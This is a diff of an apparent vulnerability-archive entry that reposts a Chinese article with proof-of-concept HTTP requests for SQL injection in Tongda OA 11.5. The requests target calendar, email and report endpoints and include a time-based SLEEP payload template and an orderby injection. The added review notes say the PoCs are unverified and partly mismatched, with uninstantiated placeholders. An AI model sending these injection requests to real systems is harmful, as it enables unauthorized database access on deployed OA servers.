@@ -1,10 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "通达OA 11.5多处SQL 注入及日程未授权"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.5 20200417实测；其他版本猜测"
+prerequisites: "多数需普通账号"
+side_effects: "延迟探测可能占用数据库连接或影响服务"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E5%85%A8%E7%BD%91%E9%A6%96%E5%8F%91%20%20%20%E9%80%9A%E8%BE%BE%20OA%20%E5%A4%9A%E6%9E%9A%200day%20%E6%BC%8F%E6%B4%9E%E5%88%86%E4%BA%AB.md"
+category_recommendation: "OA / 通达"
+id: "vw-584725564f1e0088b19cf58e"
+entity_id: "ve-584725564f1e0088b19cf58e"
+schema_version: "1"
 ---
 
-# 全网首发   通达 OA 多枚 0day 漏洞分享
+# 通达OA 11.5多处SQL 注入及日程未授权
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；11.5多处SQLi及日程未授权
+- 版本、配置及部署条件：11.5 20200417实测；其他版本猜测
+- 认证与权限前提：多数需普通账号
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 1/2节混入其他请求，3节orderby SQLi却粘贴日程URL，路由与根因错位
+- RANDNUM/SLEEPTIME占位未实例化；时间参数变成×tamp
+- 需分calendar、sentbox、inbox、repdetail、get_cal_list实体；历史0day应标日期
+
+## 操作风险
+
+延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA)
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqczeflvHvDexuf2BhBEBYlJCdjJS6aVZ0w6ooY5QwK27L2khaJWEOVdw2kunkBTviakCv6QeGxYjHg/640?wx_fmt=png)  
@@ -25,16 +65,15 @@ HW 这几天看到大家对通达 OA 的热情度很高，正好今天有空，�
 不多说，直接上 POC，有需要的可以先拿到用了。  
 **0x001 SQL 注入 POC:**
 
-```
+```http
 POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
 Referer: http://192.168.202.1/portal/home/
-Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Connection: keep-alive
 Host: 192.168.43.169
 Pragma: no-cache
 X-Requested-With: XMLHttpRequest
-Content-Length: 154
 X-WVS-ID: Acunetix-Autologin/65535
 Cache-Control: no-cache
 Accept: */*
@@ -45,11 +84,13 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&endtime=1598918400&view=month&condition=1
 ```
 
-```
+> 请求长度说明：原资料 Content-Length 为 154；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+
+```http
 GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=1&pagelimit=20&tag=×tamp=1598069133&total= HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169/
-Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
@@ -72,11 +113,11 @@ Connection: close
 **0x002 SQL 注入 POC:**  
 漏洞参数：orderby
 
-```
+```http
 GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=3--&pagelimit=10&tag=×tamp=1598069103&total= HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169
-Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
@@ -84,11 +125,11 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Connection: close
 ```
 
-```
+```http
 GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169
-Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
@@ -128,11 +169,11 @@ http://127.0.0.1/general/calendar/arrange/get_cal_list.php?starttime=1548058874&
 **0x004 SQL 注入 POC:**  
 漏洞参数：id
 
-```
+```http
 GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169
-Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
